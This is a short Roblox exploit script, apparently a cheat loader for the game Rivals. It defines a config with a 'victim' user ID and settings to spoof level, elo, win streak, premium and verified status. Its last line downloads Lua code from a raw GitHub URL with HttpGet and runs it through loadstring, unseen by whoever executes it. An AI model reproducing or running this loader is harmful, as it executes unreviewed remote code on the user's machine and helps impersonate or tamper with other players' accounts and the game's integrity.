getgenv().Config = {
    victim = 1,             -- victim userid only
    helper = "676767",                   -- helper username (keep this empty if you want to spoof yourself)
    level = 1,                    -- level override
    streak = 1,                   -- winstreak override (0 = disabled)
    elo = 1,                       -- elo override (0 = disabled)
    keys = 1,                     -- keys override (0 = disabled)
    premium = true,               -- spoof premium
    verified = true,              -- spoof verified badge
    unlockall = true,              -- unlock all
    platform = "VR",               -- OMG / TUNGSAHUR / BEAST / VERIFIED
    join = "discord.gg/rivalscomp" -- remove this and the script won't work
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/mysealhas-ak47/scripts/refs/heads/main/custom.lua"))()
